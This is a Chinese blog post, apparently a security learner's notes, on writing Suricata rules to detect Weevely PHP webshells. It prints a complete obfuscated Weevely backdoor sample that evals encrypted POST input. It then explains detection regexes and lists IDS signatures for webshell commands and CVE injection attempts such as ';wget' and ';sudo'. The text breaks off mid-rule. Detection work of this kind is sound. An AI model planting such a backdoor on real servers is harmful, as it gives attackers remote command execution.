@@ -1,0 +1,277 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>suricata规则的编写 | Spencer</title><meta name="author" content="Spencer"><meta name="copyright" content="Spencer"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="下面我们来写一下针对weevely4.0.1版本产生木马的拦截规则，首先我们通过抓包发现，在连接木马时不会通过网络层发包，只有连接成功后，执行指令时，才会通过网络层，应用层，看到TCP和HTTP请求和响应。所以我们只能针对其连接成功后执行的恶意指令执行匹配和拦截。 我们用通用正则表达式对木马进行匹配"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://www.mathming.ltd/2022/06/20/2022-6-20-suricata%E8%A7%84%E5%88%99%E7%9A%84%E7%BC%96%E5%86%99/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":1,"translateDelay":10,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: 'days',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"Author: Spencer","link":"Link: ","source":"Source: Spencer","info":"Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source."}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'suricata规则的编写',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-06-30 16:54:56'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.2.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">103</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">38</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">18</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page" href="/gallery/"><i class="fa-fw fas fa-gallery"></i><span> Gallery</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://images.pexels.com/photos/1509534/pexels-photo-1509534.jpeg?auto=compress&amp;cs=tinysrgb&amp;w=1260&amp;h=750&amp;dpr=1')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Spencer</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page" href="/gallery/"><i class="fa-fw fas fa-gallery"></i><span> Gallery</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">suricata规则的编写</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2022-06-19T16:00:00.000Z" title="Created 2022-06-20 00:00:00">2022-06-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2022-06-30T08:54:56.000Z" title="Updated 2022-06-30 16:54:56">2022-06-30</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="suricata规则的编写"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>下面我们来写一下针对weevely4.0.1版本产生木马的拦截规则，首先我们通过抓包发现，在连接木马时不会通过网络层发包，只有连接成功后，执行指令时，才会通过网络层，应用层，看到TCP和HTTP请求和响应。所以我们只能针对其连接成功后执行的恶意指令执行匹配和拦截。</p>
+<p>我们用通用正则表达式对木马进行匹配，先查看木马文件</p>
+<h2 id="weevely产生的PHP木马格式"><a href="#weevely产生的PHP木马格式" class="headerlink" title="weevely产生的PHP木马格式"></a>weevely产生的PHP木马格式</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$s</span>=<span class="string">&#x27;@x(@base6Vr4_decode($m[1])Vr,$k)))VrVr;$o=@ob_geVrtVr_conteVrnts();@Vrob_end_cleVraVr&#x27;</span>;</span><br><span class="line"><span class="variable">$B</span>=<span class="string">&#x27;$k=&quot;e10aVrdc39&quot;;Vr$kh=&quot;4Vr9baVr59abVrbe56&quot;Vr;$kf=&quot;eVr057f20f883VrVre&quot;;$Vrp=&quot;ZwNqIe&#x27;</span>;</span><br><span class="line"><span class="variable">$K</span>=<span class="string">&#x27;ents(&quot;VrpVrhp://inpVrut&quot;),Vr$m)==1) &#123;@oVrb_staVrrt();@eVrval(@gVrzuVrncompreVrsVrsVr(&#x27;</span>;</span><br><span class="line"><span class="variable">$Y</span>=<span class="string">&#x27;&#125;^Vr$Vrk&#123;$j&#125;;&#125;&#125;retVrurn $o;&#125;Vrif (@prVreg_VrmVratch(&quot;Vr/$Vrkh(.+)$Vrkf/&quot;,@fiVrle_get_cont&#x27;</span>;</span><br><span class="line"><span class="variable">$A</span>=<span class="string">&#x27;orVr($i=0Vr;$VriVr&lt;$l;)&#123;forVr($j=0;($j&lt;$cVr&amp;&amp;$Vri&lt;$l);$j+VrVr+,$i++)&#123;$o.=$t&#123;$Vri&#x27;</span>;</span><br><span class="line"><span class="variable">$V</span>=<span class="string">&#x27;n();$r=@basVre64Vr_encode(@xVr(@gzcomVrVrpress($oVr),$k));prVrint(&quot;$Vrp$kh$rVr$kf&quot;);&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$i</span>=<span class="string">&#x27;lcBgDVrHKsyVrm&quot;;functioVrVrn xVr($t,$k)&#123;$c=strlVren($Vrk);$l=stVrrlen($Vrt);$o=Vr&quot;&quot;Vr;f&#x27;</span>;</span><br><span class="line"><span class="variable">$p</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;XU&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;crXUeXUateXUXU_funXUXUction&#x27;</span>);</span><br><span class="line"><span class="variable">$T</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;Vr&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$B</span>.<span class="variable">$i</span>.<span class="variable">$A</span>.<span class="variable">$Y</span>.<span class="variable">$K</span>.<span class="variable">$s</span>.<span class="variable">$V</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$p</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$T</span>);<span class="variable">$b</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>我们解读以下，在几个这种木马中，我们可以看到一些相似的地方，比如</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$(字母)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$(字母)=<span class="title function_ invoke__">str_replace</span>();</span><br><span class="line">$(字母)=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;Vr&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$B</span>.<span class="variable">$i</span>.<span class="variable">$A</span>.<span class="variable">$Y</span>.<span class="variable">$K</span>.<span class="variable">$s</span>.<span class="variable">$V</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$p</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$T</span>);<span class="variable">$b</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这几行一般weevely生成的木马中都有，所以我们进行正则匹配</p>
+<p>先来看这样</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x3c\x3fphp[\s\n]\x24\w\x3d</span><br></pre></td></tr></table></figure>
+<p>大量存在的<code>\xab</code>类字符，后面的ab为这个字母在ascii码下的16进制表示。所以显然前面匹配的就是<code>&lt;?php</code>而后面[\s\n]。</p>
+<p>这里面\s表示匹配空格，\n表示匹配换行，也就是匹配了整个第一行，换行开始匹配第二行。</p>
+<p>然后后面的<code>\x24</code>表示$符号，\w非常神奇，表示匹配任意字母！，也就i是匹配了变量的名字。最后\x3d匹配了等号，所以我们上面呢正则表达式一直匹配到。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$s</span>=</span><br></pre></td></tr></table></figure>
+<p>对于最后三行的匹配如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$(字母)=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;Vr&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$B</span>.<span class="variable">$i</span>.<span class="variable">$A</span>.<span class="variable">$Y</span>.<span class="variable">$K</span>.<span class="variable">$s</span>.<span class="variable">$V</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$p</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$T</span>);<span class="variable">$b</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\x24\w\x3dstr_replace\x28\x27.&#123;<span class="number">1</span>,<span class="number">20</span>&#125;\x27\x2c\x27\x27\<span class="title function_ invoke__">x2c</span>(\x24\w\x2e)+\x24\w.*?</span><br><span class="line">\x24\w\x3d\x24\w\x28\x27\x27\x2c\x24\w\x28\x29\x3b.*?\x3f\x3e</span><br></pre></td></tr></table></figure>
+<p>显然我们的/x27为匹配单引号，\x2c为匹配逗号。</p>
+<p>上面\x27后面的.为匹配除了换行符以外的任何字符，而{1, 20}也就是重复1到20次。</p>
+<p>而后面唯一有争议的是<code>.*?</code>这里是匹配多个字符，贪婪匹配法，所以会匹配一行的空格，一直到最后一个换行符之前！然而?代表了收敛，也就是将匹配到的这些空格匹配0次或一次，所以只匹配一次，不会再重演这些空格！下面的式子也是这个意思，所以它和回溯匹配有一些相像，但是并没有按照回溯匹配的进行返回寻找，重新匹配。这里介绍一下回溯匹配。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert any any -&gt; any any (<span class="attr">msg</span>:<span class="variable constant_">PHP</span> weevely webshell; http.<span class="property">request_body</span>;<span class="attr">content</span>:<span class="string">&quot;&lt;?php&quot;</span>;<span class="attr">pcre</span>:<span class="string">&quot;/\x24\w\x3dstr_replace\x28\x27.&#123;1,20&#125;\x27\x2c\x27\x27\x2c(\x24\w\x2e)+\x24\w.*?\x24\w\x3d\x24\w\x28\x27\x27\x2c\x24\w\x28\x29\x3b.*?\x3f\x3e/&quot;</span>;<span class="attr">classtype</span>:weevely-webshell;<span class="attr">sid</span>:<span class="number">3</span>;<span class="attr">rev</span>:<span class="number">1</span>;)</span><br></pre></td></tr></table></figure>
+<p>组和用户是递进关系，我们配置mysql时候可以先添加组group，然后添加用户user</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">groupadd mysql</span><br><span class="line">useradd -g mysql mysql</span><br></pre></td></tr></table></figure>
+<p>然后对用户授权</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown -R mysql.mysql /usr/local/mysql-8.0</span><br></pre></td></tr></table></figure>
+<p>我们重新打开的时候，如果没有IP地址，可以进行重新分配，</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dhclient ens33</span><br></pre></td></tr></table></figure>
+<p>我们开启http服务，</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install httpd php php-common</span><br></pre></td></tr></table></figure>
+<p>下面整合weevely规则</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">alert http $EXTERNAL_NET any -&gt; $HTTP_SERVERS any (msg:&quot;ET WEB_SERVER Weevely PHP backdoor detected (passthru() function used) M1&quot;; flow:to_server,established; http.header; content:&quot;QHBhc3N0aHJ1KC&quot;;sid:2013938; rev:7;)</span><br><span class="line"></span><br><span class="line">alert http $EXTERNAL_NET any -&gt; $HTTP_SERVERS any (msg:&quot;ET WEB_SERVER Weevely PHP backdoor detected (passthru() function used) M2&quot;; flow:to_server,established; http.header; content:&quot;BwYXNzdGhydSgn&quot;;classtype:web-application-activity; sid:2025593; rev:3;)</span><br><span class="line"></span><br><span class="line">alert http $EXTERNAL_NET any -&gt; $HTTP_SERVERS any (msg:&quot;ET WEB_SERVER Weevely PHP backdoor detected (passthru() function used) M3&quot;; flow:to_server,established; http.header; content:&quot;AcGFzc3RocnUoJ&quot;;sid:2025594; rev:3;)</span><br><span class="line"></span><br><span class="line">alert http $EXTERNAL_NET any -&gt; $HTTP_SERVERS any (msg:&quot;ET WEB_SERVER Weevely PHP backdoor detected (pcntl_exec() function used)&quot;; flow:to_server,established; http.header; content:&quot;JGFyZ3MgPSBh&quot;;classtype:web-application-activity; sid:2013943; rev:7;)</span><br><span class="line"></span><br><span class="line">alert http $EXTERNAL_NET any -&gt; $HTTP_SERVERS any (msg:&quot;ET WEB_SERVER Weevely PHP backdoor detected (python_eval() function used)&quot;; flow:to_server,established; http.header; content:&quot;QHB5dGhvbl9l&quot;;classtype:web-application-activity; sid:2013942; rev:6;)</span><br><span class="line"></span><br><span class="line">alert http $EXTERNAL_NET any -&gt; $HTTP_SERVERS any (msg:&quot;ET WEB_SERVER ATTACKER WebShell - Weevely - Downloaded&quot;; flow:established,to_client; file_data; content:&quot;&lt;?php|0A|$&quot;; content:&quot;=&quot;; distance:4; within:2; content:&quot; str_replace(&quot;; distance:0; classtype:trojan-activity; sid:2020555; rev:2;)</span><br><span class="line"></span><br><span class="line">alert http $EXTERNAL_NET any -&gt; $HTTP_SERVERS any (msg:&quot;ET WEB_SERVER Weevely PHP backdoor detected (shell_exec() function used)&quot;; flow:to_server,established; http.header; content:&quot;aGVsbF9l&quot;;classtype:web-application-activity; sid:2013939; rev:5;)</span><br><span class="line"></span><br><span class="line">alert http $EXTERNAL_NET any -&gt; $HTTP_SERVERS any (msg:&quot;ET WEB_SERVER Weevely PHP backdoor detected (proc_open() function used)&quot;; flow:to_server,established; http.header; content:&quot;JHAgPSBhcnJheShhcnJh&quot;;classtype:web-application-activity; sid:2013940; rev:5;)</span><br><span class="line"></span><br><span class="line">alert http $EXTERNAL_NET any -&gt; $HTTP_SERVERS any (msg:&quot;ET WEB_SERVER Weevely PHP backdoor detected (popen() function used)&quot;; flow:to_server,established; http.header; content:&quot;JGggPSBwb3Bl&quot;;classtype:web-application-activity; sid:2013941; rev:5;)</span><br><span class="line"></span><br><span class="line">alert http $EXTERNAL_NET any -&gt; $HTTP_SERVERS any (msg:&quot;ET WEB_SERVER Weevely PHP backdoor detected (perl-&gt;system() function used)&quot;; flow:to_server,established; http.header; content:&quot;JHBlcmwgPSBuZXcg&quot;;classtype:web-application-activity; sid:2013944; rev:5;)</span><br><span class="line"></span><br><span class="line">alert http $EXTERNAL_NET any -&gt; $HTTP_SERVERS any (msg:&quot;ET WEB_SERVER Weevely PHP backdoor detected (exec() function used)&quot;; flow:to_server,established; http.header; content:&quot;ZXhlYygn&quot;;classtype:web-application-activity; sid:2013945; rev:5;)</span><br><span class="line"></span><br><span class="line">alert http $EXTERNAL_NET any -&gt; $HTTP_SERVERS any (msg:&quot;ET WEB_SERVER Weevely PHP backdoor detected (system() function used)&quot;; flow:to_server,established; http.header; content:&quot;QHN5c3Rl&quot;;classtype:web-application-activity; sid:2013937; rev:7;)</span><br><span class="line"></span><br><span class="line">alert http $EXTERNAL_NET any -&gt; $HTTP_SERVERS any (msg:&quot;ET WEB_SERVER MorXploit Shell Command&quot;; flow:established,to_server; http.uri; content:&quot;?cmd=ZXhpdA==&quot;; fast_pattern; http.user_agent; content:&quot;Mozilla 5&quot;; startswith;classtype:bad-unknown; sid:2019951; rev:3;)</span><br><span class="line"></span><br><span class="line">alert http any any -&gt; any any (msg:&quot;ET WEB_SERVER ATTACKER WebShell - 1337w0rm - cPanel Cracker&quot;; flow:established,to_server; http.request_body; content:&quot;user=CRACKER&quot;; classtype:trojan-activity; sid:2020097; rev:3;)</span><br><span class="line"></span><br><span class="line">alert http $EXTERNAL_NET any -&gt; $HTTP_SERVERS any (msg:&quot;ET WEB_SERVER PHP System Command in HTTP POST&quot;; flow:established,to_server; http.method; content:&quot;POST&quot;; http.request_body; content:&quot;&lt;?&quot;; content:&quot;system|28|&quot;; distance:0; classtype:web-application-attack; sid:2020102; rev:5;)</span><br><span class="line"></span><br><span class="line">alert http $EXTERNAL_NET any -&gt; $HOME_NET any (msg:&quot;ET WEB_SERVER WPScan User Agent&quot;; flow:established,to_server; threshold: type limit, count 1, seconds 60, track by_src; http.user_agent; content:&quot;WPScan v&quot;; depth:8; classtype:web-application-attack; sid:2020338; rev:4;)</span><br><span class="line"></span><br><span class="line">alert http $EXTERNAL_NET any -&gt; $HTTP_SERVERS any (msg:&quot;ET WEB_SERVER ATTACKER WebShell - Weevely - POSTed&quot;; flow:established,to_server; http.request_body; content:&quot;&lt;?php|0A|$&quot;; content:&quot;=&quot;; distance:4; within:2; content:&quot; str_replace(&quot;; distance:0; classtype:trojan-activity; sid:2020556; rev:3;)</span><br><span class="line"></span><br><span class="line">alert http any any -&gt; $EXTERNAL_NET any (msg:&quot;ET WEB_SERVER ATTACKER WebShell - Weevely - Cookie&quot;; flow:established,to_server; http.header; content:&quot;ing|3a| identity|0D 0A|Host|3a|&quot;; http.cookie; content:&quot;SESS=&quot;; content:&quot;|3B| SID=&quot;; distance:0; content:&quot;|3B| PREF=&quot;; distance:0; content:&quot;|3B|SSID=&quot;; distance:0; classtype:trojan-activity; sid:2020557; rev:3;)</span><br></pre></td></tr></table></figure>
+<p>试试weevely新规则</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">alert http any any -&gt; any any (msg:&quot;MALWARE BACKDOOR Weevely PHP backdoor detected&quot;; flow:established,to_server; content:&quot;POST&quot;; http_method; content:&quot;Accept-Encoding|3a| identity&quot;; http_header; content:&quot;Content-Length: 83&quot;; flowbits:set, Weevely_post_request; noalert; classtype:web-application-attack; sid:2000001;rev:1; metadata:created_at 2022_06_23, by sampson;)</span><br><span class="line"></span><br><span class="line">alert http any any -&gt; any any (msg:&quot;MALWARE BACKDOOR Weevely PHP backdoor detected&quot;; flow:established,to_client; content:&quot;200&quot;; http_stat_code; content:&quot;|3d 3d|&quot;; http_server_body; nocase;flowbits: isset, Weevely_post_request; classtype:web-application-attack;sid:2000002; rev:1; metadata:created_at 2022_06_23, by sampson;)</span><br><span class="line"></span><br><span class="line">alert http any any -&gt; any any (msg:&quot;结尾是0，有嫌疑&quot;; flow:established,to_client; content:&quot;200&quot;; http_stat_code; content:&quot;\r\n|30|&quot;; http_server_body; nocase;flowbits: isset, Weevely_post_request; classtype:web-application-attack;sid:2000002; rev:1; metadata:created_at 2022_06_23, by sampson;)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">alert http $EXTERNAL_NET any -&gt; $HTTP_SERVERS any (msg:&quot;ET EXPLOIT Authenticated QuickBox CE 2.5.5/Pro 2.1.8 RCE Attempt Inbound M1 (CVE-2020-13448)&quot;; flow:established,to_server; http.method; content:&quot;GET&quot;; http.uri; content:&quot;/index.php?id=88&amp;servicestart=&quot;; fast_pattern; content:&quot;|3b|sudo&quot;; distance:0; reference:url,www.exploit-db.com/exploits/48536; reference:url,s1gh.sh/cve-2020-13448-quickbox-authenticated-rce/; reference:cve,2020-13448; classtype:attempted-admin; sid:2030237; rev:1; metadata:attack_target Web_Server, created_at 2020_06_02, deployment Perimeter, former_category EXPLOIT, performance_impact Low, signature_severity Major, updated_at 2020_06_02;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">alert http $EXTERNAL_NET any -&gt; $HTTP_SERVERS any (msg:&quot;ET EXPLOIT Authenticated QuickBox CE 2.5.5/Pro 2.1.8 RCE Attempt Inbound M2 (CVE-2020-13448)&quot;; flow:established,to_server; http.method; content:&quot;GET&quot;; http.uri; content:&quot;/index.php?id=88&amp;servicestart=&quot;; fast_pattern; content:&quot;|3b|wget&quot;; distance:0; reference:url,www.exploit-db.com/exploits/48536; reference:url,s1gh.sh/cve-2020-13448-quickbox-authenticated-rce/; reference:cve,2020-13448; classtype:attempted-admin; sid:2030238; rev:1; metadata:attack_target Web_Server, created_at 2020_06_02, deployment Perimeter, former_category EXPLOIT, performance_impact Low, signature_severity Major, updated_at 2020_06_02;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">alert http $EXTERNAL_NET any -&gt; $HTTP_SERVERS any (msg:&quot;ET EXPLOIT Possible WordPress Plugin BBPress 2.5 - Unauthenticated Priv Esc Attempt (CVE-2020-13693)&quot;; flow:established,to_server; http.method; content:&quot;POST&quot;; http.request_body; content:&quot;user_login&quot;; content:&quot;user_pass&quot;; distance:0; content:&quot;|22|bbp_keymaster|22|&quot;; distance:0; fast_pattern; reference:url,www.exploit-db.com/exploits/48534; reference:cve,2020-13693; classtype:attempted-admin; sid:2030239; rev:1; metadata:affected_product Wordpress_Plugins, attack_target Web_Server, created_at 2020_06_02, deployment Perimeter, former_category EXPLOIT, performance_impact Low, signature_severity Major, updated_at 